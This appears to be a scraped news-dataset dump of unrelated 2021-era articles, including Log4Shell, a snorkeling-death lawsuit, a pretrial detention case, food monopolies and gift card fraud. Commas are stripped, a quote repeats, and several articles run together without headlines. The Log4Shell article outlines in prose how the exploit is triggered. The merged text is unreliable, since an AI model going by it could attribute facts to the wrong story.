Matzek missed all of the 2022 season while recovering from Tommy John surgery. There was initially talk of him beginning the season on the injured list but he showed enough during the spring to earn a spot on the Opening Day roster. Things haven’t gone well for Matzek though as he has allowed 11 runs in 10 innings across 11 appearances. He’s been hit particularly hard of late allowing six earned runs in his last three innings.",https://news.google.com/articles/CBMiigFodHRwczovL255cG9zdC5jb20vMjAyNC8wNS8xMC91cy1uZXdzL2hhd2FpaS10b3VyaXN0LWRpZXMtb24tbWF1aS1iZWFjaC1hbmQtd2lmZS1hbGxlZ2VzLXN0YXRlLWZhaWxlZC10by13YXJuLWhlci1hYm91dC1zbm9ya2VsaW5nLWRhbmdlci_SAY4BaHR0cHM6Ly9ueXBvc3QuY29tLzIwMjQvMDUvMTAvdXMtbmV3cy9oYXdhaWktdG91cmlzdC1kaWVzLW9uLW1hdWktYmVhY2gtYW5kLXdpZmUtYWxsZWdlcy1zdGF0ZS1mYWlsZWQtdG8td2Fybi1oZXItYWJvdXQtc25vcmtlbGluZy1kYW5nZXIvYW1wLw?hl=en-US&gl=US&ceid=US%3Aen,Hawaii tourist dies on Maui beach and wife alleges state failed to warn her about snorkeling danger,"A Michigan woman claims her husband’s death could have been prevented by an awareness campaign about a little-known snorkeling danger according to her lawsuit against the Hawaii Tourism Authority and the Hawaii Visitors Convention Bureau.

Officially 64-year-old Ray Johnson’s cause of death in February 2022 was ruled drowning the leading cause of death for tourists in Hawaii by a coroner according to Patti Johnson’s lawsuit.

But her attorney Jay Stuemke told Fox News Digital the experienced snorkeler’s last moments did not resemble a traditional drowning at all.

“He told a friend ‘I’m having trouble breathing’ and they tried to bring him in” Stuemke said Wednesday. “A friend helped him to shore but he died on the beach [in Maui.]”

“He told a friend ‘I’m having trouble breathing’ and they tried to bring him in” Stuemke said Wednesday. “A friend helped him to shore but he died on the beach [in Maui.]”

“Hypoxia induced by Rapid Onset Pulmonary Edema (ROPE) is the cause of some probably most snorkel related fatal and near fatal drownings” the study’s authors wrote in their interim report which is cited in Johnson’s lawsuit.

Stuemke said waiting three days after disembarking from their plane before donning a snorkel can greatly reduce the risk of “preventable death.”

“There’s barely a minute in my life that goes by that I don’t think about him” said Patti Johnson according to ABC7.

Generally tourists fly at least five hours to get to Hawaii according to the study and given that airplanes are pressurized at an equivalent of up to 8500 feet elevation “the permeability of the lung’s membranes may be affected in a way that predisposes toward the development of ROPE.”

“Ray should’ve been told that he was at particular risk of this for a variety of reasons including the fact that he’d just flown in” Stuemke said. “They were going to be in there for two weeks. His wife has told me if they knew about this safety study and what it said they would just hang out by the pool and drink Mai Tais for a couple days.

“Most people don’t just come in for a weekend to snorkel. They come for a period of time and have a number of things they want to do” Steumke said. “If they’re told they should wait they will.”

But according to Johnson’s lawsuit Hawaii’s tourism authority and other groups have done little to forewarn tourists “despite having knowledge of the risks and ready-to-use warnings at hand from this industry-funded study.”

“The [tourism authority hasn’t] shared those warnings. They aren’t prominently featured on any website or featured in any brochures or videos or anything” Stuemke said.

Between 2012 and 2021 184 tourists died in snorkeling accidents compared to just 20 local residents.

“It’s impossible on autopsy to determine if someone died by a traditional drowning or this sudden onset pulmonary edema” Stuemke said. “Either way there’s fluid in your lungs and a lack of oxygen.”

Two factors make ROPE deaths more common for snorkelers than those participating in other water activities according to the 2017 study — the swimmer’s prone position in the water and the narrow tube of their snorkels which creates resistance to inhalation.

Dr. Foti wrote in his findings that “[g]enerally the simpler the snorkel the less resistance it generated.”

5 “There’s barely a minute in my life that goes by that I don’t think about him” said Patti Johnson. Patti Johnson via ABC7

However “other factors sometimes not visible such as the size at the narrowest opening or the design of the valves made visual determination of resistance unreliable.”

The Hawaii House of Representatives attempted to pass a bill that would require first responders to record data on the types of snorkels used by tourists who drowned during the activity. But the bill was never passed according to the Hawaii State Legislature website.

The type of mask and snorkel used were only recorded in 16% of snorkeling-related deaths Foti wrote.

While a full face mask was used in five of these cases and a traditional two-piece mask was used in eleven the 2017 study noted that full face masks can’t be removed in urgent situations and users can’t “spit” their snorkel out to improve their breathing.

Stuemke said Patti had begun to print small cards with details about ROPE.

In doing so she “has been in a very real way doing more to try to educate about this than what the state of Hawaii and the tourism industry have done.”

“Any time she hears someone is going on a snorkeling trip she gives someone one of these cards and says ‘Please don’t let what happened to Ray happen to you. Wait awhile and follow these other tips'” Stuemke said.

The Hawaii Tourism Authority Hawaii Visitors and Convention Bureau the Fairmont Kea Lani Maui and Accor Management did not respond to a request for comment on the pending lawsuit.

Meticulous coordination between multiple contractors was central to completing the $79.6-million University of Texas at Dallas Sciences Building.

Features of this 187200-sq-ft structure include a scrim exterior facade that required installation of hundreds of horizontal steel supports and a steel-tube framework. Linbeck Group worked closely with masonry waterproofing steel and scrim contractors to ensure the facade’s proper and timely installation.

The building showcases a dynamic image wall a fully programmable indoor display consisting of thousands of small perforations that move in unison to create a visual light display. This wall incorporates a large metal panel that replicates the building’s scrim facade. Constructing the image wall required extensive coordination between Linbeck and the electrician drywall installer and scrim installer.

The building received LEED Gold certification for its energy conservation efforts and use of sustainable elements including energy-efficient SageGlass. Late in the project the team accepted the use of more expensive tintable electrochromic glass to better conserve energy. Through savings Linbeck found early on the contractor helped keep construction on track and ultimately saved $5 million that the owner could put toward a chiller and cooling tower.

If you think the stock market has been unstoppable since equity markets bottomed out during the initial wave of the coronavirus pandemic in March 2020 check out the cryptocurrency space. Whereas the broad-based S&P 500 is up more than 100% in a little over 20 months the aggregate value of cryptocurrencies has jumped more than 1500% to $2.36 trillion in the same period.

Although the fear of missing out (FOMO) and investor sentiment have been big drivers of these gains crypto investors have also been impressed with the number of partnerships being struck.

As you can imagine the bigger names in the crypto space have forged quite a few meaningful partnerships or merchant wins. For example Bitcoin (BTC 0.35%) is the most widely accepted digital token on the planet by retailers. Meanwhile the Enterprise Ethereum Alliance which is focused on promoting the use of the Ethereum (ETH 0.24%) blockchain has more than 100 members. Even meme coin Shiba Inu has snagged a few well-known merchants in recent weeks.

But what you might not realize is that under-the-radar cryptocurrencies are landing major partnerships too. Here are three lesser-known cryptocurrencies with some eyebrow-raising partners.

Qtum: Amazon and Google (a subsidiary of Alphabet)

Let's begin with the smallest digital token on this list as ranked by market value Qtum (QTUM -2.19%). According to CoinMarketCap.com Qtum is the 87th largest crypto with a market value of $1.11 billion as of Dec. 7.

Although it's relatively small Qtum is a blockchain project I've previously highlighted as very intriguing. That's because Qtum has developed their blockchain utilizing the best qualities from Bitcoin and Ethereum. It incorporates the transactional security of Bitcoin's UTXO model with the Ethereum Virtual Machine. In other words it's a UTXO-based platform that can support smart contracts -- protocols that verify enforce and facilitate an agreed upon transaction between two or more parties. Smart contracts are the foundation from which decentralized applications (dApps) and decentralized finance (DeFi) are being built.

Qtum is also differentiated by its Account Abstraction Layer (AAL). The AAL is Qtum's ticket to deploying smart contract upgrades while always remaining backward compatible to Bitcoin's UTXO transaction model.

But the real surprise might be that Qtum was a chosen partner for both Amazon (AMZN -1.07%) and Alphabet (GOOGL -0.77%) (GOOG -0.75%). Amazon Web Services (AWS) the cloud services arm of Amazon first partnered with Qtum in October 2018. At the time it was described as a way for AWS to allow developers to build on its cloud platform using Qtum as well as expand Amazon's offerings to enterprise customers.

In May 2019 Qtum partnered with Google Cloud to give developers and folks without much technical know-how a cost-effective way of launching nodes on the Qtum blockchain. It's not every day a relatively unknown crypto project lands Amazon and Alphabet's Google as a partner.

Zcash: JPMorgan Chase

Another under-the-radar cryptocurrency that's landed a major partnership is privacy-focused payment coin Zcash (ZEC -1.15%).

In a traditional crypto payment transaction money moves from Point A to B with only partial obscurity. This is to say that while names and identities aren't revealed on public blockchain blockchain forensics can be used to trace the public addresses of a sender and receiver. Zcash deploys zk-SNARK- zero-knowledge cryptography that helps to obfuscate these addresses. This is why Zcash is known as a privacy coin.

Although obfuscation of sender and receiver addresses is the primary lure of Zcash it should be noted that users have an option of revealing this data for auditing purposes or to maintain regulatory compliance.

The interesting thing about Zcash is that is landed bank stock JPMorgan Chase (JPM 0.64%) as a partner back in May 2017. I say interesting given CEO Jamie Dimon's distaste for cryptocurrency and his belief that Bitcoin is ""worthless"" in his own words.

Nevertheless this didn't stop JPMorgan Chase from implementing Zcash's zero-knowledge security layer atop its Ethereum-based Quorum Project to boost blockchain security. With Zcash's zero-knowledge security solution designed to work with multiple blockchain networks the hope is this could be the first of many financial institutions to adopt or test its technology.

IOTA: Dell Technologies

A final under-the-radar cryptocurrency that's snagged a major partner is IOTA (MIOTA). With a market value of $3.26 billion IOTA slots in as the 50th-largest digital currency.

Keeping with the theme of this list IOTA and its developers bring a degree of differentiation to the table that simply isn't seen with the vast majority of cryptocurrency projects.

A unique aspect of IOTA is that it's not utilizing blockchain technology to handle payment and data transfers. Rather IOTA's developers rely on the ""Tangle."" The Tangle is a direct acyclic graph (DAG) that requires new transactions to confirm two or more previous transactions. Since blockchain can be slowed by the need to generate and validate new blocks IOTA's DAG solution provides a fast way to execute fee-less transactions that are connected to each other like a tangled web. This means the network should be quickly scalable without impacting performance.

Earlier this year IOTA made waves when it announced a partnership with information technology giant Dell Technologies (DELL 0.83%). Known as Project Alvarium this partnership will focus on measuring the confidence and trust of data before it's used by an application.

According to the release from IOTA on Feb. 9 Dell first introduced its Data Confidence Fabric (DCF) in 2019. IOTA subsequently reengineered the DCF to improve its scalability and security. The journey data takes from an internet of things device sensor or edge network till it reaches the cloud will be given a trust rating and logged on IOTA's Tangle to establish an immutable score.

This partnership could play a role in improving predictive analytics for edge networking -- this is precisely what Dell and Intel are partnering to test -- and could even be useful in assessing data trustworthiness during the pandemic such as determining which manufacturing facility a vaccine originated or recording how many people have received a vaccine.

Long story short don't overlook that there's a world of intriguing projects not named Bitcoin and Ethereum."

The source of the vulnerability was Log4J a logging utility used by thousands if not millions of apps including those used inside just about every enterprise on the planet. The Minecraft servers were the proverbial canary in the coal mine.

In the four days since it’s clear Log4Shell is every bit as grave a threat as I claimed with the list of cloud services affected reading like a who’s who of the biggest names on the Internet . Threat analysts and researchers are still assessing the damage so far and the outlook over the next weeks and months. Here’s what you need to know for now.

What’s Log4J and what makes Log4Shell such a big deal? Log4J is an open source Java-based logging tool available from Apache. It has the ability to perform network lookups using the Java Naming and Directory Interface to obtain services from the Lightweight Directory Access Protocol. The end result: Log4j will interpret a log message as a URL go and fetch it and even execute any executable payload it contains with the full privileges of the main program. Exploits are triggered inside text using the ${} syntax allowing them to be included in browser user agents or other commonly logged attributes.

Here’s what exploits look like as illustrated by Juniper Networks researchers:

The vulnerability tracked as CVE-2021-44228 has a severity rating of 10 out of 10. The zero-day had been exploited at least nine days before it surfaced.

Earliest evidence we’ve found so far of #Log4J exploit is 2021-12-01 04:36:50 UTC. That suggests it was in the wild at least 9 days before publicly disclosed. However don’t see evidence of mass exploitation until after public disclosure. — Matthew Prince 🌥 (@eastdakota) December 11 2021

Researchers at Cisco's Talos security team said they observed exploits beginning December 2.

What has happened since Log4Shell surfaced last Thursday? Almost immediately security firm Greynoise detected active scanning attempting to identify vulnerable servers. Researchers report seeing this critical and easy-to-exploit vulnerability being used to install crypto-mining malware bolster Linux botnets and exfiltrate configurations environmental variables and other potentially sensitive data from vulnerable servers.

In a best-case scenario major brokerages banks and merchants will invest huge sums in overtime costs to pay large numbers of already overworked IT employees to mop up this mess during the holidays. You don’t want to think about the worst-case scenario other than to remember the 2017 breach of Equifax and the resulting compromise of 143 million US consumers’ data that followed when that company failed to patch against a similarly devastating vulnerability

Sounds bad. What should I do? Yeah it is. As an end user there's not much you can do other than to hound the services you use and ask what they're doing to keep the data you entrust with them secure. The most useful thing the cloud services can do is to update Log4J. But for large enterprises it’s often not that simple. Dozens of security companies have published guidance.

Alex Ovechkin is just made different. He eats Italian pregame that would put a normal man in a food coma. It’s also been well documented that Ovi drinks soda during games.

With the Capitals-Penguins game streaming exclusively on ESPN+ reporter Emily Kaplan took time to investigate these legendary tales about Ovi and she learned new details about The Great 8’s soda habit during games.

“Alex Ovechkin is pretty famous that he has the same pregame meal” Kaplan reported. “It’s a heavy meal from Mamma Lucia’s. I’ve also heard a rumor that he has Coca-Cola during games. I got to the bottom of it. It’s in this water bottle. It’s not Coca-Cola. It’s actually Pepsi during games. I saw him sip it a little during the first period. In the first intermission he actually likes Dr. Pepper.”

The news is surprising considering Ovechkin has long promoted drank and been sponsored by Coca-Cola.

Here’s a sampling of the Ovechkin-Coca-Cola RMNB headlines over the years.

Ovechkin is such a Coca-Cola fanatic he has multiple Coke vending machines in his house.

And to cap it off Ovechkin’s worn Coke branded t-shirts resembling a can of soda himself.

It’s unclear what spurred the change. To the best of my knowledge Capital One Arena exclusively sells Pepsi products during events.

According to Quora Dr. Pepper is not a Pepsi product but “a brand in Keurig Dr Pepper’s Dr Pepper Snapple Group division” which includes drinks like Snapple Green Mountain Coffee Peets Coffee Caribou Coffee.

After 4 years the defendant has yet to go to trial • Pennsylvania Capital-Star,"(Image AdobeStock via The Philadelphia Gay News)

By Brittany Hailer Mary Niederberger and Jody DiPerna

PITTSBUGRH — In the early morning hours of April 24 2017 Todd Robinson parked a borrowed car he was driving in a Wilkinsburg alley and went to sleep.

That decision started a chain of events that began with a parking ticket escalated to a shooting by Wilkinsburg police and landed him in the Allegheny County Jail for more than four years.

He has yet to go to trial.

On December 14 Robinson’s attorney Thomas Farrell is scheduled to argue before Common Pleas Judge Randal Todd that his client should be released because he has not been brought to trial within the statutory amount of time of 180 days. The right to a speedy trial is guaranteed under Rule 600 of the Pennsylvania Code. Rule 600 motions had been suspended by President Judge Kimberly Berkeley Clark at the onset of the pandemic in April 2020. That suspension was lifted on October 21.

Farrell could not be reached for comment and it is unclear why Robinson has spent more than four years in the county jail without going to trial.

Court records indicate Farrell is Robinson’s third lawyer and on eight different dates since November 2017 the case was put on the docket for a trial that hasn’t occurred. Robinson was offered a plea deal in June 2017 and again in October 2020 but he turned down both because he says he wants to go to trial to prove his innocence.

Mike Manko spokesperson for the Allegheny County District Attorney’s office said the office does not comment on pending cases.

Sandra Mayson professor of law at the University of Pennsylvania said: “There are supposed to be constraints on the duration of pretrial detention but the constraints are not effective. There are statutory speedy trial rules in most states. And then there’s a constitutional limit⁠—the Sixth Amendment right to a speedy trial⁠—but it’s a very amorphous standard and the time is halted or paused when the defendant continues the trial. It’s just not a very robust guarantee.”

The Administrative Office of Pennsylvania Courts provides data on the adjudication of criminal cases across the Commonwealth and by county. In Allegheny County less than one percent of the criminal cases which were resolved in 2019 went to jury trial.

In addition to the unusually long pre-trial confinement how did a routine traffic ticket—a citation which falls under the civil code ⁠—turn into a violent confrontation which ended in a man being shot? Robinson questions why the Wilkinsburg police requested identification from him when they were making a welfare check?

Wilkinsburg Police Chief Ophelia Coleman declined to comment for this story.

While questions regarding the case remain unanswered a review by the Pittsburgh Institute of Nonprofit Journalism of police investigative records legal filings and interviews with Robinson bring together details of the events that led to Robinson’s shooting and detention.

Here is the story that emerges.

How It Happened

Todd Robinson was staying with a friend in New Castle. But on the night of April 24 2017 he visited someone in the east end of Pittsburgh. His visit ended sometime after midnight and instead of driving back to New Castle he decided to sleep in the borrowed black Hyundai he was driving as he had plans to meet his cousin at an auto body shop in Wilkinsburg at 8 a.m.

At about 3 a.m. he parked the car on Taylor Way a narrow dark alley in Wilkinsburg reclined the driver’s seat pulled his jacket over him for a blanket and went to sleep.

According to transcripts of interviews given to Allegheny County detectives by Wilkinsburg Sgt. Matthew Morrison and Officer Chris Duncan Morrison was writing parking tickets and tagging abandoned cars along Taylor Way around 4:25 a.m.. As he went to put a ticket on the windshield of a black Hyundai he noticed Robinson sleeping in the car.

Morrison called Duncan for assistance. When he arrived they knocked on the window and asked the man for identification.

In Robinson’s defense brief filed in August 2019 his former attorney Patrick A. Sweeney argued that the original encounter between Robinson and the police began as a “welfare check” and “then soon was raised to search and seizure without reasonable suspicion.” The defense’s motion to suppress all evidence obtained as a result of his license background check was denied.

The defense’s position was that “Mr. Robinson was subjected to an illegal investigatory detention when after determining that he was not in distress or in need of police assistance the Wilkinsburg police requested and then retained possession of his driver’s license in order to conduct an NCIC check not supported by reasonable suspicion of criminal activity … but too in the fact that after completed Mr. Robinson was advised by Duncan that he was free to leave…”

According to Morrison and Duncan’s statements dispatch indicated “no wants no warrants” after a background check on Robinson’s ID. They gave Robinson a parking ticket and told him to move the car and come back later when the autobody shop opened. Robinson drove out of the alley.

The check of records did not indicate that Robinson had violated parole by leaving the halfway house where he was supposed to be staying after his release from prison. Robinson said he left the halfway house about two weeks prior to this incident and he was sure the parole violation would pop up when he handed over his license. He was relieved when it didn’t.

A few minutes after Robinson left Wilkinsburg police dispatch called the officers back correcting the earlier report and indicating Robinson had a parole violation. Morrison told county investigators “… it was a parole violation and he has a propensity for violence some sort of with a weapons charge and something to that effect.”

In 1995 when he was 17 Robinson shot a man during a robbery. He served more than 20 years for homicide leaving prison in March 2017 a month before his encounter with Wilkinsburg police.

According to the officers’ statements they separated to search Wilkinsburg for Robinson. About an hour after that second call from dispatch Duncan and Morrison were patrolling separately when Morrison spotted the Hyundai in the parking lot of the McDonald’s at the corner of Penn and Pennwood Avenues. Duncan pulled in diagonally behind the Hyundai and Morrison pulled in behind Duncan. Duncan said he attempted to talk to Robinson.

Robinson said he didn’t see the police when he first walked out of the restaurant but even when he did he didn’t think they were there for him.

“They just let me go an hour ago. I see the lights come on. So I’m looking I’m thinking something happened in the McDonald’s or something” Robinson said.

What Happened Next

This next part happened quickly according to all involved.

Robinson got in his car. He remembers putting his coffee in the cupholder and then Duncan was at the driver’s side of the Hyundai. Morrison said Duncan and Robinson got to the car at the same time. Morrison stated he exited his car and moved to a spot on the passenger side of the car. He told investigators he drew his weapon at this point.

Duncan said he had his hand on the driver’s door of the car. Robinson said Duncan yelled and reached into the car as he reached towards his weapon with his other hand.

Robinson said he feared for his life thinking to himself “He’s going to kill me. It’s in his eyes.”

“[Duncan] said ‘Motherf⁠—r’ and he reached for his firearm. That’s what made me do what I did” Robinson said.

Duncan said he had similar fears about Robinson. He told county police he let go of the door handle and he thought he knew what Robinson was thinking: “I was in fear for my safety I mean this guy would have did (sic) anything to get away even if that meant striking my sarge and he didn’t care.”

I know I wouldn’t have lived. The two shots that fired in my back tells me they would have continued to shoot – Todd Robinson

Robinson backed the car up and hit the police vehicle behind him. Robinson said he didn’t even know it was there until he hit it.

There are conflicting descriptions of what happened next but at some point Duncan fired into the car shooting Robinson. According to court documents Morrison fired one round and Duncan fired at least two.

Robinson was shot in the shoulder and the bullet entered the left side of his chest according to his medical records. He drove out of the lot quickly. He feared for his life.

“I know I wouldn’t have lived. The two shots that fired in my back tells me they would have continued to shoot” he said.

As he drove away from the McDonald’s parking lot Robinson said he was bleeding heavily. Duncan got in his car and took off after Robinson. Morrison followed behind.

Robinson crashed near the Family Dollar store at the corner of Penn and Brushton Avenues. Duncan spotted the Hyundai. He found Robinson injured and bleeding in bushes alongside the Family Dollar.

Robinson survived the shooting and underwent surgery for a gunshot wound to his left shoulder at UPMC Shadyside. The day after the shooting Allegheny County Police filed a criminal complaint against him charging ten criminal counts: aggravated assault (two counts) possession of a firearm criminal mischief carrying a firearm without a license fleeing or attempting elude police reckless endangerment (two counts) vehicle or property damage and reckless driving.

Robinson was taken to the Allegheny County Jail. He has remained there since.

Following this incident Duncan was awarded “2017 Officer of the Year” by the Teamsters Local Union 205. In the award announcement the union published a statement written by Duncan that included his account of shooting Robinson and Paul Anthony Adams Jr. 32 who Duncan shot and critically wounded eight months later. Adams ran a red light in Point Breeze and when pulled over got out of his car with a shotgun. Duncan shot Adams.

The Court Case

In 2018 Adams was sentenced to six years in prison for two counts of aggravated assault.

The possession of a firearm charge against Robinson stemmed from police discovering a gun in a bag under the passenger seat of his friend’s car. The gun was found by Allegheny County police after they obtained a search warrant following the shooting. Because Robinson had a felony conviction he is prohibited from purchasing or possessing a firearm.

Robinson said the gun was not his and he didn’t know it was in the vehicle. Police and court records do not include any accusations that Robinson used or showed the gun during the incident. Sweeney Robinson’s former attorney also motioned to suppress evidence of the gun in August 2019.

The suppression motion argued there was no probable cause to search the vehicle.

The Supreme Court ruled that evidence found by officers during illegal stops may be used in court if officers conducted searches after confirming suspects had outstanding warrants.

Judge Todd found that Robinson’s constitutional rights were not violated and the motions to suppress evidence from the license background check and the search warrant for the vehicle were denied in July 2019.

Sweeney wrote in the motion “…the subsequent flight car crash and gathering of evidence inside the car are ‘fruit of the poisonous tree’ created by Officer Duncan’s actions and the Commonwealth should not be permitted to use any evidence gathered in the Hyundai after the crash…”

Of hitting the police cruiser Robinson said: “I was trying to save my own life.”

We all love a good bowl of Cheerios. And who doesn’t like Fritos bean dip with their tortilla chips? I’m betting that you’re like me and grab a can of soup or a jar of salsa off the shelf without thinking twice.

Well maybe next time we should.

A recent study revealed that just a few massively powerful companies control nearly 80% of the market share of many items purchased by ordinary consumers at the supermarket. Those Cheerios I mentioned? Yep General Mills Kellogg and Post own almost 75% of the market. Those salsas and dips? PepsiCo (who owns Tostitos Lays and Fritos) owns a whopping 90% of that market.

So what’s the problem? Well with the ability of giant corporations to own so much of the American food system farmers workers and consumers are suffering. This week a joint investigation by the Guardian and Food and Water Watch found that a small number of corporations control virtually every part of the food supply chain–from seeds and fertilizers to slaughterhouses and supermarkets. This leads to limited power for farmers dangerous working conditions for workers and higher prices for consumers.

It is time that antitrust laws are put in place to limit these conglomerates and protect all people involved in this system.

Mega-companies like Kellog Kraft Heinz and Tyson that control the food system have significant ability to decide what the 2 million farmers across America grow and how much they are paid. In fact a measly 15 cents of every dollar we spend in the grocery store goes to a farmer.

Advocates also note that along with financial pressures there is a serious mental health crisis among farmers. Farmers are among the most likely to commit suicide compared with other occupations and more than 450 farmers died by suicide across the Midwest from 2014-2018 . Calls to the crisis hotline Farm Aid increased by 110% from 2017 to 2018.

Let’s try to remember the next time we eat a tortilla chip or a Sara Lee bagel (Grupo Bimbo owns almost 70% of the bagel market) a farmer had to grow the ingredients to make it. We would do well to remind giant food corporations of this as well and establish antitrust policies limiting their power and supporting the lives of farmers.

Additionally food industry workers who are predominantly migrants and people of color face dangerous situations at the hands of these corporations. It is widely known that farms especially meatpacking plants are among the most dangerous workplaces in the country. People work long hours for extremely low wages and are exposed to everything from pesticides and animal waste to dangerous machinery and toxic heat levels.

Finally consumers also bear the brunt of the American monopolistic food system. Economically speaking limited competition among businesses means higher prices and fewer choices for buyers. This could not be more true in the agricultural space. For decades until the 1990s most people shopped at local grocery stores. Now just four corporations–Walmart Kroger Costco and Albertsons–dominate over half of the retail space. That means we as consumers are limited in what stores we can go to and are at the mercy of the prices the companies want to set.

These are just a few of the ways in which the current American food monopoly impacts people at every stage of the process. Last week President Biden signed an executive order addressing monopolies across the country which included food and farming.

Let’s hope something comes of this order. It is time that antitrust laws are put in place to limit these conglomerates and protect all people involved in this system.

The company's baking facility stayed closed Saturday before reopening the next day. But production at the New Jersey-based facility came to stop again Thursday.

The culprit? Not enough cream cheese.

""Cream cheese is our No. 1 ingredient. It's in 85% of what we do"" said Junior's Cheesecake third-generation owner Alan Rosen.

Rosen's company gets its yearly 4 million pounds of cream cheese from Philadelphia Cream Cheese. Between supplying cheesecakes for its mail-order business its restaurants and around 8000 supermarkets across the country Junior's Cheesecakes uses around 40000 pounds of cream cheese in a day and a half according to Rosen.

The issue began two weeks ago when orders of cream cheese didn't show up.

It couldn't come at a worse time since November and December are the busiest months of the year for the company Rosen said.

Supply chain woes:Almost 50% of Victoria's Secret holiday products stuck offshore as Black Friday approaches

And it could be some time before things return to normal for Junior's Cheesecake. Rosen said Kraft Heinz the company that owns Philadelphia Cream Cheese told him the ""intermittent supply issue"" could take up to the three months to level off. Despite this Rosen said they won't be switching brands.

""We don't switch brands"" he said. ""It's the cream cheese we've always used to make our cheesecakes and we're very loyal. We're going to work through it together.""

It's not just partners like Junior's Cheesecake increasing demand. A spokesperson for Kraft Heinz said the company is ""maximizing our production to meet unprecedented demand.""

""We’re shipping 30-35% more product to foodservice partners vs. a year ago"" the spokesperson said in an email to USA TODAY. And at home consumption which has remained 18% higher than 2019 levels is adding to demand according to the statement.

In New York City bagel shops are struggling with their own cream cheese shortage according to reporting from the New York Times.

So how did we get here? A cyberattack strangely enough.

Schreiber Foods a large producer of dairy products including cream cheese had to close down for a number of days in October after operations were halted at its plants and distribution centers due to a ""cyber event.""

But even a few days down was enough to cause ""shockwaves"" in the supply chains said Mark Stephenson the director of Dairy Policy Analysis at the University of Wisconsin.

""Dairy plants for fresh products like that don't stockpile a lot of inventory. So we can't draw on that to smooth out a hiccup of a plant going down for several days time"" Stephenson said.

There are other things contributing to the shortage too said Andrew Tobisch a spokesperson for Schreiber Foods.

""Every cream cheese provider has struggled to keep up with demand"" Tobisch said in an email to USA TODAY. ""While that demand has been steady it’s really world events that are the biggest driver. Things like the pandemic labor shortages and supply chain disruptions are all hurdles that everyone is having to overcome.""",https://news.google.com/articles/CBMiKmh0dHBzOi8vd3Jrci5jb20vY2hpY2tlbi1hbmQtd2FmZmxlLXBpenphL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Kalamazoo Restaurants Tiptoe Into Chicken and Waffle Pizza Trend,"Say you want pickle on your pizza? That was so 2020. Recently the ""it"" pizza has been chicken and waffle. Chicken on pizza? Sure it's been done. Breakfast pizza? Yeah that's a thing if usually savory.

Go with waffles and sweet maple syrup? Now you're in pineapple territory and someone's gonna want to fight.

Where to Find Chicken and Waffle Pizza near Kalamazoo

On the Kalamazoo Menu Facebook group some commentors have noticed the trend pop up elsewhere in their social feeds and got curious if any Kalamazoo area restaurants or pizzerias have crafted a chicken and waffle pizza. Turns out they have.

It seems simple enough slice up some chicken tenders pop some waffle dough into an iron or run out and get a box of Eggo and top with some of your finest quality Log Cabin.

So where can you find chicken and waffle pizza near Kalamazoo? Turn out the Mitten in Grand Rapids and Long Island Cafe in Battle Creek either have it on the menu or have made it as a special.

The Origins of Chicken and Waffles

While you may envision a piece of fried chicken paired with a buttery waffle and syrup on the side that's not the origin of the dish. That version of chicken and waffles was first served at a supper club in Harlem in the late 1930. The dish actually dates back to the Pennsylvania Dutch in the 1600s serving stewed chicken over a plain waffle with gravy.

Neither is Chicken and waffle pizza a new phenomenon. Check YouTube and you'll find videos dating back a few years extolling the syrupy pie. Papa Johns tried a Chicken and Waffle pizza as part of the 'Nashville hot/hot honey' food trend of the late 2010s.

While food trends will come and go (as chicken and waffle pizza certainly will) some of these foods of the last century are still on your table today while some you have never heard of.

PORTLAND Ore. — Area workers have voted to strike against Fred Meyer and Quality Food Centers (QFC) both subsidiaries of The Kroger Co. for alleged unfair labor practices.

According to a press release from United Food and Commercial Workers Union Local 555 which represents 29000 workers in Oregon and Southwest Washington members voted ""overwhelmingly"" to call for a strike.

""Fred Meyer and QFC have repeatedly violated their legal duties to negotiate in good faith with Local 555 with the most blatant example being Fred Meyer’s refusal to provide information necessary for the Union to negotiate a new agreement and to process grievances"" said UFCW 555 President Dan Clay in the release which was sent out Saturday. ""The way these employers have violated the National Labor Relations Act has left grocery workers no choice but to take action.""

UFCW Local 555 said it has been in negotiations for a new contract for the workers since July 2021.

Fred Meyer and QFC agreed to continue the bargaining process through Thursday Dec. 16 to try to reach a deal and avoid a strike.

""The pandemic has highlighted both the importance of grocery workers to our communities as well as the struggles they endure to make ends meet all while producing record profits for Fred Meyer and QFC"" said Sandy Humphrey the secretary-treasurer for UFCW 555. ""Essential Employees deserve the same care and respect now that they have shown our neighbors over the last two years. These employers refuse to acknowledge that their worker’s wages are not keeping up with the cost of living leaving them and their families at risk while providing food for our community.""

A Fred Meyer spokesperson provided KGW with a company response Sunday night:

""It’s business as usual at Fred Meyer"" the statement read. ""A strike authorization doesn’t mean a strike. Our current offer shows our commitment to the whole person providing wage increases high-quality affordable health care and a pension benefit for retirement. The most productive thing the union can do is to work with the company in a manner that positively addresses these items. Our focus remains on our associates and getting an agreement at the bargaining table.""",https://news.google.com/articles/CBMiRmh0dHBzOi8vd3d3LmNic25ld3MuY29tL3RleGFzL25ld3MvaS10ZWFtLW1vbmV5LWJhY2stZ2lmdC1jYXJkLXN0b2xlbi_SAUpodHRwczovL3d3dy5jYnNuZXdzLmNvbS9hbXAvdGV4YXMvbmV3cy9pLXRlYW0tbW9uZXktYmFjay1naWZ0LWNhcmQtc3RvbGVuLw?hl=en-US&gl=US&ceid=US%3Aen,UPDATE: I-Team Gets Man's Money Back After Gift Card Stolen,"FORT WORTH (CBSDFW.COM) - Following a series of investigations into gift card fraud the I-Team finally got a Texas man his money back.

Musician Robert Adale Davis contacted the I-Team this summer. He joins several other consumers who have called the I-Team after becoming victims of a gift card fraud which we've been reporting for years.

The consumers all had gift cards. They knew the cards should have balances. And yet when they tried to use them the cards were empty.

Davis showed the I-Team his receipt. He paid $130 dollars in July for a Visa gift card at Kroger; however within an hour of buying it the card had a zero balance.

Davis said ""It just kept coming back declined.""

Experts have explained to us how thieves remove the cards from store shelves use card readers to record the numbers and then return the cards to the store. The minute you activate your card the scammers steal it.

""Lawmakers need to look at it"" said Shannon Greer a former insider who talked to the I-Team last month.

Industry insiders have told us lawmakers need to step in and tighten the security on the cards.

The I-Team has fought to get several consumers their money back through the years; however for Davis it took months.

But​ fortunately after our story aired last month the I-Team spoke again to a spokesperson from Kroger.

The head of Visa communications contacted us as well. Late last week Visa followed up stating: ""The resolution is underway.""

Kroger also sent an email stating Visa is ""...processing the dispute and will mail him (Davis) a replacement card on Monday 12/6 to arrive within 7-10 business days.""

